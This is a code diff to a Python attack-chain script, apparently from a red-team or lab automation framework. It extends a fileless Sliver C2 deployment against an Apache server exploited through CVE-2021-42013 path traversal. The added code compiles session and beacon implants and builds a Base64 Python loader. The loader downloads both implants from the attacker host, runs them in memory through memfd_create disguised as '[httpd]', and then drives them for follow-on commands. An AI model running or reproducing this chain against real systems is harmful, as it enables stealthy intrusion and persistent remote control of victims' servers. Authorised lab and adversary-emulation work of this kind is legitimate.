@@ -18,15 +18,16 @@ from chainlog import log
 #   T1036.005 – Masquerading: Match Legitimate Name (`[httpd]` argv[0])
 #   T1071.001 – Application Layer Protocol: Web Protocols  (Sliver HTTP C2)
 # -----------------------------------------------------------------------------
-# Drops a single in-memory Sliver implant on the apache target via a Base64-
+# Drops two in-memory Sliver implants on the apache target via a Base64-
 # encoded Python loader delivered through CVE-2021-42013 path-traversal RCE:
-#   * Session implant — real-time, used for interactive execution
-# The implant is an anonymous file descriptor (memfd_create) and process-
-# masquerades as `[httpd]` under www-data. No on-disk artefact on the target.
+#   * Session implant — real-time, used for interactive enumeration / upload
+#   * Beacon implant  — 5-second async check-in, used for long-running tasks
+# Both implants are anonymous file descriptors (memfd_create) and process-
+# masquerade as `[httpd]` under www-data. No on-disk artefact on the target.
 #
 # Chain-orchestrator entrypoint: ``run(target_ip, kali_ip) -> dict`` which
-# returns ``{"sliver_session": <id>}`` for downstream advanced steps
-# (advanced_webserver_post_exploit_enum / _privesc) to drive.
+# returns ``{"sliver_session": <id>, "sliver_beacon": <id>}`` for downstream
+# advanced steps (advanced_webserver_post_exploit_enum / _privesc) to drive.
 # =============================================================================
 
 
@@ -215,10 +216,32 @@ def ensure_sliver_listener():
     )
 
 def ensure_beacon_compiled(kali_ip):
-    """Verify that the target Sliver beacon implant is compiled at /tmp.
+    """Verify that both target Sliver implants (session and beacon) are compiled at /tmp.
     If missing, triggers a background garble compilation via sliver-client.
     """
-    # Ensure C2 Beacon implant is compiled (5s interval for responsive execution)
+    # 1. Ensure real-time Session implant is compiled
+    if not os.path.exists("/tmp/session_implant"):
+        log(f"[*] C2 Session implant not found. Compiling targeting {kali_ip}:8080...")
+        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/session_implant\nexit\n"
+        rc_path = "/tmp/compile_session.rc"
+        with open(rc_path, "w") as f:
+            f.write(rc_content)
+
+        cmd = ["sliver-client", "--rc", rc_path]
+        try:
+            res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+            if "saved to /tmp/session_implant" in res.stdout or os.path.exists("/tmp/session_implant"):
+                log("[+] C2 Session implant successfully compiled.")
+            else:
+                log(f"[-] Error compiling Session: {res.stdout}")
+                sys.exit(1)
+        except subprocess.TimeoutExpired:
+            log("[-] Timeout: Session compilation took longer than 300 seconds.")
+            sys.exit(1)
+    else:
+        log("[+] C2 Session implant exists at /tmp/session_implant.")
+
+    # 2. Ensure passive Beacon implant is compiled (check-in interval set to 5 seconds for testing)
     if not os.path.exists("/tmp/beacon_implant"):
         log(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 5s sleep...")
         rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 5 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
@@ -261,14 +284,25 @@ def ensure_file_server():
 def build_payload(kali_ip, file_port):
     """Generate the Base64-encoded Python loader payload.
     This loader runs entirely in-memory using the memfd_create system call.
-    It downloads and runs the beacon implant. The process masquerades as
-    '[httpd]' under www-data.
+    It downloads and runs BOTH the session implant and the beacon implant in parallel,
+    allowing comparative analysis. Both processes masquerade as '[httpd]' under www-data.
     """
     loader_code = f"""import urllib.request, ctypes, os, sys
 try:
     libc = ctypes.CDLL(None)
 
-    # Download and execute C2 Beacon (2s interval)
+    # 1. Download and execute C2 Session (real-time)
+    url_sess = "http://{kali_ip}:{file_port}/session_implant"
+    with urllib.request.urlopen(url_sess) as r:
+        data_sess = r.read()
+    fd_sess = libc.syscall(319, b'httpd_cache', 1)
+    if fd_sess >= 0:
+        os.write(fd_sess, data_sess)
+        if os.fork() == 0:
+            os.execve(f"/proc/self/fd/{{fd_sess}}", ["[httpd]"], os.environ)
+            sys.exit(0)
+
+    # 2. Download and execute C2 Beacon (5s interval)
     url_beac = "http://{kali_ip}:{file_port}/beacon_implant"
     with urllib.request.urlopen(url_beac) as r:
         data_beac = r.read()
@@ -330,13 +364,13 @@ def fire_exploit(target_url, kali_ip, file_port=8000):
             s.close()
 
 def check_sliver_session():
-    """Run sliver-client to query beacons."""
-    cmd = ["sh", "-c", "echo 'beacons' > /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
+    """Run sliver-client to query both sessions and beacons."""
+    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'beacons' >> /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
     try:
         res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
         return res.stdout
     except Exception as e:
-        log(f"[-] Error checking Sliver beacons: {e}")
+        log(f"[-] Error checking Sliver sessions/beacons: {e}")
         return ""
 
 def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
@@ -355,23 +389,23 @@ def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
     # 1. Fire the exploit
     fire_exploit(target_url, kali_ip, file_port)
 
-    # 2. Wait and poll for the beacon in Sliver
+    # 2. Wait and poll for the sessions/beacons in Sliver
     log("[*] Waiting for Sliver C2 check-ins (polling every 5s)...")
     for attempt in range(1, 15):
         time.sleep(5)
         output = check_sliver_session()
-        # Look for any active beacons in Sliver's output
+        # Look for any active connections/beacons in Sliver's output
         if "linux" in output.lower() or "active" in output.lower():
             lines = output.splitlines()
             matches = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
             if matches:
-                log("[+] Success! Active C2 beacon detected in Sliver:")
+                log("[+] Success! Active C2 connection(s) detected in Sliver:")
                 for m in matches:
                     log(f"    {m}")
                 return True
         log(f"[*] Attempt {attempt}/14: No C2 check-ins yet...")
 
-    log("[-] Timeout: Sliver beacon failed to establish.")
+    log("[-] Timeout: Sliver connections failed to establish.")
     return False
 
 
@@ -425,7 +459,6 @@ def _list_sliver(query: str, timeout: int = 10) -> str:
         res = subprocess.run(
             ["sliver-client", "--rc", rc_path],
             capture_output=True, text=True, timeout=timeout,
-            stdin=subprocess.DEVNULL,
         )
         return res.stdout
     except Exception as e:
@@ -433,103 +466,50 @@ def _list_sliver(query: str, timeout: int = 10) -> str:
         return ""
 
 
-def _poll_beacon_task(beacon_id: str, task_id: str, max_polls: int = 60, poll_interval: int = 2) -> str | None:
-    rc_path = f"/tmp/fetch_{task_id}.rc"
-    with open(rc_path, "w") as f:
-        f.write(f"use {beacon_id}\n")
-        f.write(f"tasks fetch {task_id}\n")
-        f.write("exit\n")
-        
-    for i in range(max_polls):
-        time.sleep(poll_interval)
-        try:
-            res = subprocess.run(
-                ["sliver-client", "--rc", rc_path],
-                capture_output=True, text=True, timeout=30,
-                stdin=subprocess.DEVNULL,
-            )
-            fetch_out = res.stdout
-            if "✅ Completed" in fetch_out:
-                if "[*] Output:" in fetch_out:
-                    return fetch_out.split("[*] Output:", 1)[1].strip()
-                return fetch_out
-        except Exception as e:
-            log(f"[-] Error polling task {task_id}: {e}")
-    return None
+def sliver_exec(implant_id: str, *commands: str, timeout: int = 30) -> str:
+    """Drive a Sliver implant: ``use <id>`` followed by each command, then ``exit``.
 
-
-def sliver_exec(implant_id: str, *commands: str, timeout: int = 120, poll_interval: int = 2) -> str:
-    """Drive a Sliver implant (session or beacon).
-    
-    If the implant is a beacon, automatically waits for each tasked command
-    to complete by polling 'tasks fetch <task_id>' and returns the accumulated
-    output. If it is a session, executes instantly.
+    Reused by advanced_webserver_post_exploit_enum and advanced_webserver_privesc.
+    Returns the captured sliver-client stdout; caller is responsible for any
+    parsing (per-command output is interleaved without a clean delimiter).
     """
     import attacklog
-    accumulated_output = []
-    
     for cmd in commands:
         log(f"$ {cmd}")
-        rc_path = f"/tmp/sliver_cmd_{implant_id}.rc"
-        with open(rc_path, "w") as f:
-            f.write(f"use {implant_id}\n")
+    rc_path = "/tmp/sliver_exec.rc"
+    with open(rc_path, "w") as f:
+        f.write(f"use {implant_id}\n")
+        for cmd in commands:
             f.write(f"{cmd}\n")
-            f.write("exit\n")
+        f.write("exit\n")
+    try:
+        res = subprocess.run(
+            ["sliver-client", "--rc", rc_path],
+            capture_output=True, text=True, timeout=timeout,
+        )
+        out = res.stdout
+        
+        # Clean sliver output lines
+        clean_lines = []
+        for line in out.splitlines():
+            # Skip C2 banners, prompt interactions, and empty status logs
+            if (line.startswith("[*] Active session") or
+                line.startswith("sliver (") or
+                line.strip() == "exit" or
+                "using session" in line.lower()):
+                continue
+            clean_lines.append(line)
+        cleaned_output = "\n".join(clean_lines).strip()
+        if cleaned_output:
+            attacklog._append_output(cleaned_output)
             
-        try:
-            res = subprocess.run(
-                ["sliver-client", "--rc", rc_path],
-                capture_output=True, text=True, timeout=timeout,
-                stdin=subprocess.DEVNULL,
-            )
-            output = res.stdout
-        except subprocess.TimeoutExpired:
-            log(f"[-] sliver_exec command {cmd!r} timed out after {timeout}s")
-            continue
-        except Exception as e:
-            log(f"[-] sliver_exec command {cmd!r} failed: {e}")
-            continue
-            
-        # Check if this command was tasked on a beacon
-        m = re.search(r"Tasked beacon \w+ \((.*?)\)", output)
-        if m:
-            task_id = m.group(1)
-            # Poll for the task output
-            task_output = _poll_beacon_task(implant_id, task_id, poll_interval=poll_interval)
-            if task_output:
-                accumulated_output.append(task_output)
-                # Clean sliver output lines for the attacklog
-                clean_lines = []
-                for line in task_output.splitlines():
-                    if (line.startswith("[*] Active session") or
-                        line.startswith("sliver (") or
-                        line.strip() == "exit" or
-                        "using session" in line.lower() or
-                        "using beacon" in line.lower()):
-                        continue
-                    clean_lines.append(line)
-                cleaned_output = "\n".join(clean_lines).strip()
-                if cleaned_output:
-                    attacklog._append_output(cleaned_output)
-            else:
-                accumulated_output.append(f"[-] Task {task_id} timed out or failed.")
-        else:
-            accumulated_output.append(output)
-            # Clean sliver output lines for the attacklog
-            clean_lines = []
-            for line in output.splitlines():
-                if (line.startswith("[*] Active session") or
-                    line.startswith("sliver (") or
-                    line.strip() == "exit" or
-                    "using session" in line.lower() or
-                    "using beacon" in line.lower()):
-                    continue
-                clean_lines.append(line)
-            cleaned_output = "\n".join(clean_lines).strip()
-            if cleaned_output:
-                attacklog._append_output(cleaned_output)
-            
-    return "\n".join(accumulated_output)
+        return out
+    except subprocess.TimeoutExpired:
+        log(f"[-] sliver_exec(use {implant_id}, …) timed out after {timeout}s")
+        return ""
+    except Exception as e:
+        log(f"[-] sliver_exec(use {implant_id}, …) failed: {e}")
+        return ""
 
 
 def sliver_upload(implant_id: str, local_path: str, remote_path: str,
@@ -559,25 +539,30 @@ def sliver_upload(implant_id: str, local_path: str, remote_path: str,
 def run(target_ip: str, kali_ip: str = "10.10.0.2", file_port: int = 8000) -> dict:
     """Chain-orchestrator entrypoint.
 
-    Establishes the fileless Sliver Session on the apache target and
-    returns its ID so downstream advanced steps (post_exploit_enum,
-    privesc) can drive it via :func:`sliver_exec`.
+    Establishes the fileless Sliver Session + Beacon on the apache target and
+    returns their IDs so downstream advanced steps (post_exploit_enum,
+    privesc) can drive them via :func:`sliver_exec`.
 
     Raises:
-        RuntimeError: if the implant never calls back or never appears in the
-                      sliver-client sessions table.
+        RuntimeError: if the implants never call back or never appear in the
+                      sliver-client sessions/beacons tables.
     """
     success = deploy_fileless_c2(target_ip, kali_ip, file_port=file_port)
     if not success:
-        raise RuntimeError("advanced exploit returned no Sliver beacon")
+        raise RuntimeError("advanced exploit returned no Sliver session/beacon")
 
-    sess_id = _parse_last_active_id(_list_sliver("beacons"))
+    sess_id = _parse_last_active_id(_list_sliver("sessions"))
+    beac_id = _parse_last_active_id(_list_sliver("beacons"))
     if not sess_id:
-        raise RuntimeError("advanced exploit: beacon implant did not appear in Sliver")
-    log(f"[+] Sliver Beacon ID: {sess_id}")
+        raise RuntimeError("advanced exploit: session implant did not appear in Sliver")
+    log(f"[+] Sliver Session ID: {sess_id}")
+    if beac_id:
+        log(f"[+] Sliver Beacon ID:  {beac_id}")
+    else:
+        log("[!] Sliver Beacon not visible yet -- downstream steps may need a brief wait")
     return {
         "sliver_session": sess_id,
-        "sliver_beacon":  sess_id,
+        "sliver_beacon":  beac_id,
     }
 
 
